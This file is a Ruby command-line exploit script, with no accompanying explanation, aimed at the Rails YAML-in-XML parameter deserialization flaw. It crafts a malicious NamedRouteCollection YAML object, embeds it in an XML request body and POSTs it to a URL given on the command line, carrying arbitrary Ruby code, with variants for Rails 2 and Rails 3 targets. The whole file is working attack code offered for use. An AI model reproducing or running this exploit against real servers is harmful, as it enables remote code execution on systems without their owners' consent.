require 'net/http'
require 'uri'
require 'yaml'
require 'cgi'

def escape_payload(payload, target = :rails3)
  case target
  when :rails3 then "foo\n#{payload}\n__END__\n"
  when :rails2 then "foo\nend\n#{payload}\n__END__\n"
  else
    raise(ArgumentError, "unsupported target: #{target}")
  end
end

def wrap_payload(payload)
  "(#{payload}; @executed = true) unless @executed"
end

def exploit(url, payload, target = :rails3)
  escaped_payload = escape_payload(wrap_payload(payload), target)
  encoded_payload = escaped_payload.to_yaml.sub('--- ', '').chomp

  yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
  }.strip

  xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{CGI.escapeHTML(yaml)}</exploit>
  }.strip

  uri = URI.parse(url)
  request = Net::HTTP::Post.new(uri.path)
  request['Content-Type'] = 'text/xml'
  request['X-HTTP-Method-Override'] = 'get'
  request.body = xml

  response = Net::HTTP.start(uri.host, uri.port) do |http|
    http.request(request)
  end

  response
end

if $0 == __FILE__
  unless ARGV.length >= 2
    $stderr.puts "usage: #{$0} URL RUBY [rails3|rails2]"
    exit -1
  end

  url     = ARGV[0]
  payload = ARGV[1]
  target  = ARGV.fetch(2, :rails3).to_sym

  puts "POSTing #{payload} to #{url} ..."
  response = exploit(url, payload, target)

  case response.code
  when '200' then puts "Success!"
  when '500' then puts "Error!"
  else            puts "Received response code #{response.code}"
  end

  puts "Response Body: #{response.body}"
end
